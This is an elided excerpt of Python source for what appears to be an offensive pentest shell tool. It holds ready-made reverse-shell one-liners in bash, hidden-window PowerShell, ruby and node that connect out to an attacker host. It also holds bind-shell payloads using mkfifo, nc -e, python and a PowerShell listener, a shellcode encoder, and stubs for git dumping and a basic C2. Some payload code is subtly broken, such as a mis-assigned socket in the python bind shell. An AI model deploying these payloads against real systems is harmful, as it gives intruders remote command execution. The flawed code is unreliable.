...
""")  
    ...
    def do_reverse_shell(self, arg):  
        ...
        shells = {  
            'bash': '/bin/bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1',  
            ...
            'powershell': "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+$pwd+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",  
            'ruby': "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"" + lhost + "\"," + lport + "))'",  
            'node': 'node -e "require(\'net\').connect(' + lport + ',\'' + lhost + '\',function(){require(\'child_process\').exec(\'/bin/sh -i\',function(e,o){this.end(o)})})"',  
        }  
        if stype == 'all':  
    ...
    def do_bind_shell(self, arg):  
        ...
        binds = {  
            'bash': 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p ' + port + ' > /tmp/f',  
            'nc': 'nc -lvnp ' + port + ' -e /bin/bash',  
            'python': "python3 -c 'import socket,subprocess,os;s=s.socket(s.AF_INET,s.SOCK_STREAM);s.bind((\"0.0.0.0\"," + port + "));s.listen(1);c,addr=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'",  
            'powershell': "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$listener=New-Object System.Net.Sockets.TcpListener('0.0.0.0'," + port + ");$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=iex $data 2>&1|Out-String;$sendback2=$sendback+'PS '+$pwd+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"",  
        }  
    ...
    def do_shell_encode(self, arg):  
        ...
        print(f"{Colors.GREEN}[+] MSF Format: {''.join('\\\\x' + format(b, '02x') for b in code)}{Colors.RESET}")  
...
def do_git_dump(self, arg):  
    ...
    def do_c2_basic(self, arg):  
        ...
        print("""{Colors.GREEN}[+] Server code:{Colors.RESET}  
...
""")  
        print("""{Colors.GREEN}[+] Client code:{Colors.RESET}  
